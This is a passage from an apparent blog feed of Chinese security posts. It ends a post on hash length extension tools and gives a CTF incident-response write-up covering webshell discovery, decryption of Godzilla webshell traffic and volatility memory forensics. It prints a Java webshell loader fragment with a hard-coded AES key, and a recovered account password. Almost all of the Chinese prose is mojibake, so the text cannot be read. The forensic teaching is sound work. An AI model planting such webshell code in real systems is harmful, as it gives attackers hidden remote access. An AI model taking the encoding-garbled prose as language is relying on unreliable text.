title="åˆ©ç”¨å·¥å…·exploit"></a>åˆ©ç”¨å·¥å…·exploit</h2><h3 id="hash-ext-attack-master"><a href="#hash-ext-attack-master" class="headerlink" title="hash-ext-attack-master"></a>hash-ext-attack-master</h3><h3 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h3><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104095951008.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><h3 id="hash-extender"><a href="#hash-extender" class="headerlink" title="hash_extender"></a>hash_extender</h3><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€å±Šsolaråº”æ€¥å“åº”-wp</title>
      <link href="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"/>
      <url>/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€å±Šsolaråº”æ€¥å“åº”æ¯”èµ›-å¤ç°"><a href="#ç¬¬ä¸€å±Šsolaråº”æ€¥å“åº”æ¯”èµ›-å¤ç°" class="headerlink" title="ç¬¬ä¸€å±Šsolaråº”æ€¥å“åº”æ¯”èµ› å¤ç°"></a>ç¬¬ä¸€å±Šsolaråº”æ€¥å“åº”æ¯”èµ› å¤ç°</h1><h2 id="æ—¥å¿—æµé‡"><a href="#æ—¥å¿—æµé‡" class="headerlink" title="æ—¥å¿—æµé‡"></a>æ—¥å¿—æµé‡</h2><h3 id="æ—¥å¿—æµé‡1"><a href="#æ—¥å¿—æµé‡1" class="headerlink" title="æ—¥å¿—æµé‡1"></a>æ—¥å¿—æµé‡1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼štomcat-wireshark.zip/web</span><br><span class="line">æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š</span><br><span class="line">é»‘å®¢ç–‘ä¼¼åˆ é™¤äº†webshellåé—¨ï¼Œå°ç‹æ‰¾åˆ°äº†å¯èƒ½æ˜¯æ”»å‡»ç—•è¿¹çš„æ–‡ä»¶ä½†ä¸ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œè¯·å¸®ä»–æ’æŸ¥ä¸€ä¸‹ã€‚</span><br><span class="line">flagæ ¼å¼ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>webç›®å½•ï¼Œå­˜åœ¨åé—¨ï¼Ÿé‚£å°±ç”¨dç›¾æ‰«</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094743847.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>codeæ˜¯base64ç¼–ç ï¼Œæ€€ç–‘æ˜¯flagï¼Œè§£ç çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f!l^a*g&#123;A7b4_X9zK_2v8N_wL5q4&#125;</span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—æµé‡2"><a href="#æ—¥å¿—æµé‡2" class="headerlink" title="æ—¥å¿—æµé‡2"></a>æ—¥å¿—æµé‡2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼štomcat-wireshark.zip/web</span><br><span class="line">æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š</span><br><span class="line">å°ç‹æ‹¿åˆ°äº†å½“æ—¶è¢«å…¥ä¾µæ—¶çš„æµé‡ï¼Œå…¶ä¸­ä¸€ä¸ªIPæœ‰è®¿é—®webshellçš„æµé‡ï¼Œå·²æå–éƒ¨åˆ†æ”¾åœ¨äº†ä¸¤ä¸ªpcapngä¸­äº†ã€‚è¯·å¸®ä»–è§£å¯†è¯¥æµé‡ã€‚</span><br><span class="line">flagæ ¼å¼ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®1æ˜¯åé—¨å˜›ï¼Œé‚£ä¹ˆå¯†ç ï¼ŒåŠ å¯†æ–¹å¼ç­‰è‚¯å®šåœ¨é‡Œé¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure><p>AESåŠ å¯†ï¼Œå¯†é’¥ä¹Ÿç»™äº†a2550eeab0724a69</p><p>è¿™é‡Œå…ˆçœ‹æµé‡åŒ…ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095121947.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ä¸å‡ºæ„å¤–è¿™å°±æ˜¯æˆ‘ä»¬éœ€è¦æŸ¥çœ‹çš„æµé‡äº†ã€‚b.jsp</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095203297.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p><strong>è¿™é‡Œè¯´ä¸€ä¸‹å¦‚ä½•åˆ¤æ–­å“¥æ–¯æ‹‰æµé‡ç‰¹å¾ï¼š</strong></p><p><a href="https://feifeitan.cn/index.php/archives/280/">https://feifeitan.cn/index.php/archives/280/</a></p><p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">https://blog.csdn.net/sinat_31884905/article/details/132548617</a></p><p>å…·ä½“å¯ä»¥çœ‹æˆ‘çš„ç¬”è®°ã€‚</p><p>è¿™é‡Œæ ¹æ®Cookieå€¼æœ€åå‡ºç°äº†åˆ†å·å¯ä»¥åˆ¤æ–­å®ƒæ˜¯å“¥æ–¯æ‹‰æµé‡ï¼ï¼</p><p>ç„¶åæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯è§£å¯†å“¥æ–¯æ‹‰æµé‡ã€‚</p><p>å‘ç°è¿™ä¸ªæµé‡çš„æ ¼å¼æ˜¯rawçš„ï¼Œå¾ˆæ··æ·†ï¼Œä¸æ˜¯æ ‡å‡†çš„base64ï¼Œé‚£ä¹ˆæˆ‘ä»¬è½¬æ¢åˆ°åŸå§‹æ•°æ®ï¼Œç›´æ¥ç”¨cyberchefè§£å¯†å³å¯ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102503964.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102526760.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¯†é’¥ä¹Ÿæœ‰äº†ï¼Œè®¾ç½®ä¸€ä¸‹ç„¶åå†æ¥ä¸€ä¸ªGunzipå³å¯ã€‚</p><p>è¿™è¦ç¿»å¥½ä¹…ï¼Œç»ˆäºç¿»åˆ°äº†ä¸€ä¸ªflag.txtï¼Œreadfileï¼Œé‚£ä¹ˆflagå¯èƒ½å°±åœ¨è¯·æ±‚åŒ…ä¸­ï¼</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102614706.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102812837.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sA4hP_89dFh_x09tY_lL4SI4&#125;</span><br></pre></td></tr></table></figure><h3 id="æ—¥å¿—æµé‡3"><a href="#æ—¥å¿—æµé‡3" class="headerlink" title="æ—¥å¿—æµé‡3"></a>æ—¥å¿—æµé‡3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼štomcat-wireshark.zip/web</span><br><span class="line">æ–°æ‰‹è¿ç»´å°ç‹çš„Geoserveré­åˆ°äº†æ”»å‡»ï¼š</span><br><span class="line">å°ç‹æ‹¿åˆ°äº†å½“æ—¶è¢«å…¥ä¾µæ—¶çš„æµé‡ï¼Œé»‘å®¢ç–‘ä¼¼é€šè¿‡webshellä¸Šä¼ äº†æ–‡ä»¶ï¼Œè¯·çœ‹çœ‹é‡Œé¢æ˜¯ä»€ä¹ˆã€‚</span><br><span class="line">flagæ ¼å¼ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Œé‚£ä¹ˆdataè‚¯å®šæ˜¯å¾ˆå¤§çš„ï¼Œå°çš„å°±ä¸ç”¨çœ‹äº†ï¼Œçœ‹flagä¸‹é¢é‚£ä¸ªï¼Œæœ‰å¯èƒ½å°±æ˜¯ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103101771.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103109050.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>flag.pdfï¼Œå†è½¬å˜ä¸ºasciiçœ‹ä»”ç»†ç‚¹</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103208759.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/octet-stream</span><br></pre></td></tr></table></figure><p>é‚£åº”è¯¥å°±æ˜¯ä¸Šä¼ flag.pdfæ–‡ä»¶äº†ï¼æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å¯¼å‡ºå®ƒï¼</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103655329.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¯¼å‡ºä¸ºpdfæ–‡ä»¶ç„¶åè§£å‹å³å¯ã€‚</p><p>è¿™é‡Œæœ‰ç‚¹å¥‡æ€ªï¼Œä¸åº”è¯¥å¯¼å‡ºä¸ºgzç„¶åè§£å‹å‡ºpdfå˜›ï¼Ÿä½†æ˜¯æˆ‘ç›´æ¥å¯¼å‡ºä¸ºpdfå°±è¡Œäº†ã€‚ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103829037.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dD7g_jk90_jnVm_aPkcs&#125;</span><br></pre></td></tr></table></figure><h2 id="å†…å­˜å–è¯"><a href="#å†…å­˜å–è¯" class="headerlink" title="å†…å­˜å–è¯"></a>å†…å­˜å–è¯</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æè¿°</span><br><span class="line">æœ¬é¢˜ä½œä¸ºç­¾åˆ°é¢˜,è¯·ç»™å‡ºé‚®æœå‘ä»¶é¡ºåºã€‚</span><br><span class="line"></span><br><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])</span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k</span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=</span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;</span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec</span><br><span class="line"></span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])</span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)</span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">To: hellosolartest@qq.com</span><br><span class="line"></span><br><span class="line">From: éå¬ªç«¶ç¼ƒæˆœä¿Š</span><br><span class="line">Subject:xxxxxxxxxx</span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line"></span><br><span class="line">XXXXXXXXXX</span><br><span class="line"></span><br><span class="line">flagæ ¼å¼ä¸ºflag&#123;domain1|...|domainN&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-1"><a href="#å†…å­˜å–è¯-1" class="headerlink" title="å†…å­˜å–è¯-1"></a>å†…å­˜å–è¯-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">è¯·æ‰¾åˆ°rdpè¿æ¥çš„è·³æ¿åœ°å€</span><br><span class="line">flagæ ¼å¼ flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>ç»™äº†ä¸€ä¸ªrawæ–‡ä»¶ã€‚</p><p>å†…å­˜å–è¯ç›´æ¥æ‹¿å‡ºæˆ‘ä»¬çš„volatility</p><p>è¦æŸ¥çœ‹è·³æ¿åœ°å€ï¼Œé‚£è‚¯å®šè¦çœ‹ç«¯å£ä½¿ç”¨æƒ…å†µï¼Œä½¿ç”¨netscan</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110142358.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110211801.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110242420.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å…¶ä»–éƒ½æ˜¯0.0.0.0çš„ï¼Œçœ‹ä¸­é—´è¿™äº›å°±è¡Œäº†ã€‚</p><p>filefox.exeæ˜¯ç«ç‹æµè§ˆå™¨çš„è¿›ç¨‹ï¼Œæ„Ÿè§‰ä¹Ÿæ²¡å¿…è¦çœ‹ï¼Œçœ‹svchost.exeè¿˜æœ‰ä¸ªSystemè¿˜æœ‰ä¸ªspoolsv.exeå°±è¡Œï¼Œéƒ½è¯•ä¸€ä¸‹ã€‚</p><p>æœ€åè¯•å‡ºæ¥å°±æ˜¯è¿™ä¸ªï¼Œå…¶å®è¿™é‡Œä¹Ÿä¸ç”¨è¯•ï¼Œrdpå˜›ä¹Ÿå°±æ˜¯è¿œç¨‹æ¡Œé¢åè®®ï¼Œå¯¹åº”3389ç«¯å£ï¼Œçœ‹è°è¿æ¥äº†æˆ‘ä»¬æœ¬åœ°çš„3389ç«¯å£å³å¯ã€‚é‚£å°±åªæœ‰ä¸‹é¢è¿™ä¸ªå•¦ï¼</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110352142.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.60.220&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-2"><a href="#å†…å­˜å–è¯-2" class="headerlink" title="å†…å­˜å–è¯-2"></a>å†…å­˜å–è¯-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">è¯·æ‰¾åˆ°æ”»å‡»è€…ä¸‹è½½é»‘å®¢å·¥å…·çš„IPåœ°å€</span><br><span class="line">flagæ ¼å¼ flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯ä¸‹è½½é»‘å®¢å·¥å…·ï¼Œé‚£ä¹ˆnetscançš„è¿æ¥è‚¯å®šæ˜¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä½†æˆ‘ä»¬æ— æ³•åˆ¤æ–­æ˜¯å“ªä¸ªï¼Œåªèƒ½ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œè¿™æ˜¯ä¸€ç§æ–¹æ³•ã€‚</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œä¸‹è½½é»‘å®¢å·¥å…·ï¼Œé‚£ä¹ˆé»‘å®¢è‚¯å®šè¦æ‰§è¡Œå‘½ä»¤ï¼Œæˆ‘ä»¬çœ‹cmdscanå³å¯ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110908943.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ç›´æ¥çœ‹åˆ°äº†mimikatzï¼Œé‚£å¯¹åº”çš„ipåœ°å€å°±æ˜¯155.94.204.67å•¦ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;155.94.204.67&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-3"><a href="#å†…å­˜å–è¯-3" class="headerlink" title="å†…å­˜å–è¯-3"></a>å†…å­˜å–è¯-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">æ”»å‡»è€…è·å–çš„â€œFusionManagerèŠ‚ç‚¹æ“ä½œç³»ç»Ÿå¸æˆ·ï¼ˆä¸šåŠ¡å¸æˆ·ï¼‰â€çš„å¯†ç æ˜¯ä»€ä¹ˆ</span><br><span class="line">flagæ ¼å¼ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111119862.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111344755.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>çœ‹cmdlineçœ‹åˆ°ä¸€ä¸ªpass.txtï¼Œæœ‰å¯èƒ½å°±æ˜¯ã€‚åŒæ—¶æ ¹æ®å‘½ä»¤æ‰§è¡Œçš„é¡ºåºï¼Œpass.txtåº”è¯¥åœ¨æ¡Œé¢ä¸Š</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨filescanæŸ¥çœ‹æ–‡ä»¶</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111435871.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>ä½¿ç”¨ dumpfiles æ’ä»¶å¯¼å‡º</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111637244.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\åº”æ€¥å“åº”æ¯”èµ›\ã€é¢˜ç›®ã€‘å°é¢˜+ç»¼åˆé¢˜\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D</span><br><span class="line"> ./</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111723222.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GalaxManager_2012&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-4"><a href="#å†…å­˜å–è¯-4" class="headerlink" title="å†…å­˜å–è¯-4"></a>å†…å­˜å–è¯-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">è¯·æ‰¾åˆ°æ”»å‡»è€…åˆ›å»ºçš„ç”¨æˆ·</span><br><span class="line">flagæ ¼å¼ flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>è·å–æ³¨å†Œè¡¨ä¸­çš„ç”¨æˆ·å³å¯ï¼Œå¾ˆç®€å•ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111905095.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\åº”æ€¥å“åº”æ¯”èµ›\ã€é¢˜ç›®ã€‘å°é¢˜+ç»¼åˆé¢˜\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  &quot;SAM\Domains\Account</span><br><span class="line">\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ASP.NET&#125;</span><br></pre></td></tr></table></figure><h3 id="å†…å­˜å–è¯-5"><a href="#å†…å­˜å–è¯-5" class="headerlink" title="å†…å­˜å–è¯-5"></a>å†…å­˜å–è¯-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®æ–‡ä»¶ï¼šSERVER-2008-20241220-162057</span><br><span class="line">è¯·æ‰¾åˆ°æ”»å‡»è€…åˆ©ç”¨è·³æ¿rdpç™»å½•çš„æ—¶é—´</span><br><span class="line">flagæ ¼å¼ flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸€ï¼š</strong></p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112051539.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p>å¯ä»¥æ‰¾åˆ°è¿›ç¨‹1908ï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰æ—¶é—´ã€‚</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹è¿›ç¨‹ã€‚</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112208817.png" class="" title="å›¾ç‰‡å¼•ç”¨æ–¹æ³•ä¸€"><p><strong>PIDï¼ˆProcess IDï¼‰</strong></p><ul><li><strong>å®šä¹‰</strong>ï¼šPID æ˜¯æ“ä½œç³»ç»Ÿåˆ†é…ç»™æ¯ä¸ªè¿è¡Œä¸­è¿›ç¨‹çš„å”¯ä¸€æ ‡è¯†ç¬¦ã€‚æ¯ä¸ªè¿›ç¨‹åœ¨ç³»ç»Ÿä¸­éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ PIDï¼Œç”¨äºæ ‡è¯†è¿›ç¨‹ã€‚</li><li><strong>ä½œç”¨</strong>ï¼šPID ç”¨äºåŒºåˆ†ä¸åŒçš„è¿›ç¨‹ï¼Œæ˜¯ç³»ç»Ÿå†…æ 